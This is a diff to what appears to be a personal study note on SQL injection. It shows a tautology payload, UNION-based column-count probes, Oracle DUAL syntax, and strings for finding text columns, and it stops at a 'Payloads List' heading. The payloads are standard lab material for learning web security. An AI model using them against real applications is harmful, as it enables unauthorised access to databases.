@@ -8,21 +8,23 @@ SQL injection common occurrences location:
 - `SELECT` statements, within the `ORDER BY` clause
 
 
-
-
 `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
- Can add OR '1'='1' --
- `SELECT * FROM products WHERE category = 'Gifts' OR'1'='1' -- AND released = 1`
+`OR '1'='1' --`
+`SELECT * FROM products WHERE category = 'Gifts' OR'1'='1' -- AND released = 1`
 
 `Union` attacks allows us to execute one or more `SELECT` queries and append result to original query.
 
 `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
 
-Union attack requirements
-- Returns same number of columns.
-- Data types must be companiable.
+Find number of columns in using UNION.
+`UNION SELECT NULL-- `
 
+DB specific syntax.
+Oracle -> `' UNION SELECT NULL FROM DUAL--`
 
+Find column to a data type
+`' UNION SELECT NULL,'a',NULL,NULL--`
+`' UNION select NULL, 'CqPDHh', NULL  --`
 
 ```
 Payloads List
